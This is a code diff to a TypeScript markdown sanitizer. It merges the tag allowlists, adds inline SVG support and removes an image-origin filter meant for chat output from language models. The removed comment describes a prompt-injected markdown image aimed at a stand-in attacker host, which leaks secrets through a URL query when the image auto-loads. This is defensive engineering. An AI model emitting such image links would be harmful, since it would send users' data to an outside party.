@@ -15,10 +15,17 @@
  *      the schema is ever loosened).
  *
  * COUPLED-ALLOWLIST INVARIANT (tested in __tests__/sanitize-invariant.test.ts):
- * `effectivePrePassTags ⊆ effectiveSanitizerTags`, both computed AFTER
- * merging `extraAllowedHtmlTags`. The pre-pass must never admit a raw tag
- * the sanitizer then silently drops. Both effective lists derive from the
- * shared sources in THIS module — never fork them.
+ * the two effective tag lists are EQUAL (case-insensitively), both computed
+ * AFTER merging `extraAllowedHtmlTags`. Both directions matter:
+ *   - pre-pass ⊆ sanitizer: the pre-pass must never admit a raw tag the
+ *     sanitizer then silently drops.
+ *   - sanitizer ⊆ pre-pass: the pre-pass must never ESCAPE a tag the
+ *     sanitizer would happily keep. This direction was broken before
+ *     2026-07: `strike` (and every other `defaultSchema`-only tag) survived
+ *     the sanitizer but was escaped to `&lt;strike&gt;` source text by the
+ *     pre-pass, so legacy authored markup regressed to visible tag soup.
+ * Both lists are now derived from the SINGLE `effectiveTagList()` below —
+ * never fork them.
  */
 import { defaultSchema } from 'rehype-sanitize'
 import { visit } from 'unist-util-visit'
@@ -53,12 +60,44 @@ export const SAFE_HTML_TAGS = new Set([
   'button', 'input', 'label', 'select', 'option', 'optgroup', 'textarea', 'form', 'fieldset', 'legend',
 ])
 
-/** Effective pre-pass tag set for a composition. */
+/**
+ * Inline SVG element set, in the CANONICAL case parse5 produces for SVG
+ * foreign content (`linearGradient`, `clipPath`, … are camelCase in the
+ * HTML parser's SVG adjustment table, so the sanitize schema must match
+ * that spelling; the text pre-pass lowercases before lookup).
+ *
+ * Inline `<svg>` renders in real published posts (hand-authored diagrams,
+ * pasted icon sprites). The pre-unification Rich renderer had NO pre-pass
+ * and NO sanitizer, so it always rendered; without this set the unified
+ * engine would escape it to visible source text.
+ */
+export const SVG_TAGS = new Set([
+  'svg', 'path', 'circle', 'ellipse', 'g', 'rect', 'line', 'polyline',
+  'polygon', 'text', 'tspan', 'defs', 'use', 'symbol', 'title', 'desc',
+  'marker', 'mask', 'pattern', 'linearGradient', 'radialGradient', 'stop',
+  'clipPath',
+])
+
+/**
+ * THE effective tag list for a composition, canonical case — the single
+ * source both the pre-pass set and the sanitize schema derive from
+ * (coupled-allowlist invariant, both directions).
+ *
+ * `defaultSchema.tagNames` is unioned in so the pre-pass can never escape a
+ * tag hast-util-sanitize would keep (`strike`, `tt`, …).
+ */
+function effectiveTagList(extraAllowedHtmlTags?: string[]): string[] {
+  return [
+    ...(defaultSchema.tagNames ?? []),
+    ...SAFE_HTML_TAGS,
+    ...SVG_TAGS,
+    ...(extraAllowedHtmlTags ?? []),
+  ]
+}
+
+/** Effective pre-pass tag set for a composition (lowercased for lookup). */
 export function buildEffectiveTagSet(extraAllowedHtmlTags?: string[]): Set<string> {
-  if (!extraAllowedHtmlTags?.length) return SAFE_HTML_TAGS
-  const merged = new Set(SAFE_HTML_TAGS)
-  for (const tag of extraAllowedHtmlTags) merged.add(tag.toLowerCase())
-  return merged
+  return new Set(effectiveTagList(extraAllowedHtmlTags).map((t) => t.toLowerCase()))
 }
 
 // ---------------------------------------------------------------------------
@@ -92,8 +131,17 @@ const EXTRA_ATTRIBUTES: Record<string, Array<string | [string, ...unknown[]]>> =
   track: ['src', 'kind', 'srcLang', 'label', 'default'],
   time: ['dateTime'],
   details: ['open'],
-  // Form elements (allow the benign presentational subset)
-  input: ['type', 'checked', 'disabled', 'name', 'value', 'placeholder', 'readOnly'],
+  // Form elements (allow the benign presentational subset).
+  //
+  // `input` is DELIBERATELY absent. defaultSchema pins `required.input` to
+  // `{ type: 'checkbox', disabled: true }` — that is the GFM task-list
+  // contract, and the spread in buildSanitizeSchema keeps it. Widening
+  // `input`'s attribute allowlist (type/name/value/placeholder/readOnly)
+  // does NOT widen `required`, so an authored `<input type="text"
+  // placeholder="email">` got force-rewritten into a disabled checkbox —
+  // strictly worse than not admitting the attributes at all. We keep the
+  // task-list intent and drop the widening (lowest-risk of the two fixes;
+  // no surface authors real form inputs in markdown today).
   button: ['type', 'disabled', 'name', 'value'],
   select: ['disabled', 'multiple', 'name'],
   option: ['value', 'selected', 'disabled'],
@@ -103,6 +151,31 @@ const EXTRA_ATTRIBUTES: Record<string, Array<string | [string, ...unknown[]]>> =
   col: ['span'],
   colgroup: ['span'],
 }
+
+/**
+ * SVG presentation/geometry attributes. hast keys SVG properties by
+ * property-information's camelCase names (`strokeWidth`, `fillRule`, …)
+ * while raw authored markup uses the dashed spelling — both forms are
+ * listed so the schema matches whichever the parser hands us.
+ */
+const SVG_ATTRIBUTES = [
+  'viewBox', 'xmlns', 'd', 'fill', 'stroke', 'cx', 'cy', 'r', 'rx', 'ry',
+  'x', 'y', 'x1', 'y1', 'x2', 'y2', 'points', 'transform', 'opacity',
+  'offset', 'width', 'height',
+  'strokeWidth', 'stroke-width',
+  'fillRule', 'fill-rule',
+  'strokeLinecap', 'stroke-linecap',
+  'strokeLinejoin', 'stroke-linejoin',
+  'stopColor', 'stop-color',
+  'gradientUnits', 'gradientTransform',
+  'preserveAspectRatio',
+  'clipPath', 'clip-path',
+  'clipRule', 'clip-rule',
+  // `href` / `xlink:href` are DELIBERATELY NOT allowed on SVG elements:
+  // `<use href>` pulls in external document fragments and the hast key
+  // (`xlinkHref`) is outside rehypeStripUnsafe's URL_ATTRS check, so it
+  // would be an unguarded URL sink. Inline SVG needs neither.
+]
 
 export interface BuildSanitizeSchemaOptions {
   extraAllowedHtmlTags?: string[]
@@ -120,17 +193,26 @@ export interface BuildSanitizeSchemaOptions {
  *   (the urlTransform below is the second gate).
  */
 export function buildSanitizeSchema(options: BuildSanitizeSchemaOptions = {}) {
-  const tagNames = new Set<string>([
-    ...(defaultSchema.tagNames ?? []),
-    ...SAFE_HTML_TAGS,
-  ])
-  for (const tag of options.extraAllowedHtmlTags ?? []) tagNames.add(tag.toLowerCase())
+  // Canonical spelling AND lowercase for every tag: parse5 emits SVG
+  // foreign-content tags camelCased (`linearGradient`), HTML tags
+  // lowercased — admitting both keeps the schema list a superset of the
+  // (lowercased) pre-pass set, so the two are equal case-insensitively.
+  const tagNames = new Set<string>()
+  for (const tag of effectiveTagList(options.extraAllowedHtmlTags)) {
+    tagNames.add(tag)
+    tagNames.add(tag.toLowerCase())
+  }
 
   const attributes: Record<string, Array<string | [string, ...unknown[]]>> = {
     ...(defaultSchema.attributes as Record<string, Array<string | [string, ...unknown[]]>>),
   }
   for (const [tag, attrs] of Object.entries(EXTRA_ATTRIBUTES)) {
     attributes[tag] = [...(attributes[tag] ?? []), ...attrs]
+  }
+  for (const tag of SVG_TAGS) {
+    attributes[tag] = [...(attributes[tag] ?? []), ...SVG_ATTRIBUTES]
+    const lower = tag.toLowerCase()
+    if (lower !== tag) attributes[lower] = [...(attributes[lower] ?? []), ...SVG_ATTRIBUTES]
   }
 
   return {
@@ -280,7 +362,7 @@ function escapeOutsideFences(segment: string, allowedTags: Set<string>): string 
 }
 
 // ---------------------------------------------------------------------------
-// URL transform + LLM-surface URL policy
+// URL transform
 // ---------------------------------------------------------------------------
 /**
  * Extends react-markdown's default safe-protocol allowlist with the two
@@ -291,37 +373,4 @@ export function cardAwareUrlTransform(url: string, key: string): string {
   if (key === 'href' && typeof url === 'string' && (url.startsWith('card://') || url.startsWith('mention://')))
     return url
   return defaultUrlTransform(url)
-}
-
-/**
- * Exfiltration defense for LLM-rendered surfaces: images auto-load on
- * render, so a prompt-injected `![](https://attacker/log?d=<secret>)`
- * exfiltrates silently. Chat compositions pass an origin allowlist;
- * content compositions (authored markdown) pass `'all'`.
- */
-export interface MarkdownUrlPolicy {
-  /** Origins allowed to auto-load as images. `'all'` disables filtering. */
-  allowedImageOrigins?: string[] | 'all'
-  /** What to render for a blocked image: drop entirely or show a placeholder. */
-  onBlockedUrl?: 'drop' | 'placeholder'
-}
-
-export function isImageSrcAllowed(src: string, policy?: MarkdownUrlPolicy): boolean {
-  if (!policy || policy.allowedImageOrigins === 'all' || policy.allowedImageOrigins === undefined) return true
-  // Relative URLs resolve same-origin — always allowed.
-  if (src.startsWith('/') && !src.startsWith('//')) return true
-  try {
-    const origin = new URL(src).origin
-    return policy.allowedImageOrigins.some((allowed) => {
-      try {
-        return new URL(allowed).origin === origin
-      } catch {
-        return allowed === origin
-      }
-    })
-  } catch {
-    // Unparseable / partially-streamed URL: not a completed URL token —
-    // do not load (policy evaluates only terminated URLs).
-    return false
-  }
 }
